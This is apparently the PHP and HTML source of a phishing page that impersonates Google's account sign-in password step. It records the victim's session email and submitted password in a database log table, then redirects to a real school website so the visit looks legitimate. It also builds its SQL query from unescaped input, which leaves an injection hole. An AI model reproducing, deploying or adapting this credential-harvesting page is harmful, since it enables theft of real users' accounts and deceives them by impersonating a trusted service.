<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link rel="stylesheet" href="style.css">
    <title>Sign in - Google Accounts</title>
    <style>
        /* Override "Email or Phone" text */
        .inputLabel:before {
            content: "Enter your password";
        }
    </style>
</head>

<?php
session_start();
include("db.php");
$email = $_SESSION['email'];
if (isset($_POST['password'])) {
    date_default_timezone_set('Asia/Hong_Kong');
    $time = date('Y-m-d H:i:s', time());
    $password = $_POST['password'];
    $_SESSION['password'] = $password; // do not drop, still used in proc.php

    db_open();
    db_query("INSERT INTO `log`(`date`, `email`, `password`) VALUES ('$time','$email','$password')");
    header("Location: https://www.stmarks.edu.hk/web/");
}
?>

<body>
    <div class="inputContainer">
        <img src="/assets/google.png" alt="” width=”87" height="33" style="margin-bottom: 12px; margin-top: 32px">
        <h2 class=”login“>Welcome</h2>
        <a href="/index.php" style="text-decoration: none; color: black;">
            <div class="email-pill">
                <svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="14px" height="14px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                </svg>
                <?php
                echo "<h4 class='use' style='font-size: 14px; margin-top: 0; font-family: `Google Sans`, sans-serif;'>&nbsp;&nbsp;$email</h4>"
                ?>

                <svg aria-hidden="true" class="stUf5b MSBt4d" fill="currentColor" focusable="false" width="14px" height="14px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                    <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
                </svg>
            </div>
        </a>
        <form method="post">
            <div>
                <input type="password" class="gInput" id="password" name="password" style="margin-top: 52px;">
                <label class="inputLabel" for="email" style="top: 55%;"></label>
                <div class="forgotContainer">
                    <label class="checkbox-container">
                        <p style="font-size: 14px; color: black; font-family: roboto; margin-top: 2px">&nbsp;&nbsp;Show password</p>
                        <input type="checkbox">
                        <span class="checkmark"></span>
                    </label>
                </div>

            </div>
            <h4 class="guest" style="color: transparent; -webkit-user-select: none; -moz-user-select: none;-ms-user-select: none; user-select: none;">Not your computer? Use Guest mode to sign in privately. <span style="color: transparent">Learn more</span></h4>
            <div class="buttonContainer">
                <p class="btnCreate">Forgot password?</p>
                <input type="submit" class="btnNext" value="Next">
            </div>
    </div>
    </form>
    </div>
    <script>
        // Bugfix: hide "Email or Phone" when user has inputted text
        const gInput = document.querySelector('.gInput');
        const inputLabel = document.querySelector('.inputLabel');

        gInput.addEventListener('input', function() {
            if (gInput.value !== '') {
                inputLabel.classList.add('active');
            } else {
                inputLabel.classList.remove('active');
            }
        });

        inputLabel.addEventListener('click', function() {
            inputLabel.classList.add('focused');
            gInput.focus();
        });

        gInput.addEventListener('blur', function() {
            if (gInput.value === '') {
                inputLabel.classList.remove('focused');
            }
        });
    </script>
    <div class="bottomContainer">
        <p class="language">&#x25BC English (United States)</p>

        <a class="hpt" href="https://accounts.google.com/TOS?loc=HK&hl=en-US">Terms</a>
        <a class="hpt" href="https://accounts.google.com/TOS?loc=HK&hl=en-US&privacy=true">Privacy</a>
        <a class="hpt" href="https://support.google.com/accounts?hl=en-US&p=account_iph">Help</a>
</body>

</html>